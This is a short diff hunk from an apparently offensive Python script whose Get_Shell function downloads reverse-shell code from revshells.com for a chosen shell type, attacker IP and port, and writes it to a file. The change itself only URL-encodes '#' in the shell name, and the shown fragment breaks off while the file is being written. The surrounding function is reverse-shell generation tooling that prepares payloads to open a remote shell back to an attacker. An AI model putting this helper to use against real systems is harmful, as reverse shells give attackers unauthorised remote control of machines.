@@ -3,6 +3,7 @@
 import requests
 
 def Get_Shell(SHELL, IP, PORT, ARCHIVE):
+    SHELL = SHELL.replace('#', '%23')
     url = f'https://www.revshells.com/{SHELL}?ip={IP}&port={PORT}&shell=sh&encoding=sh'
     reverse_shell = requests.get(url).text
     with open(f'{ARCHIVE}', 'w') as file:
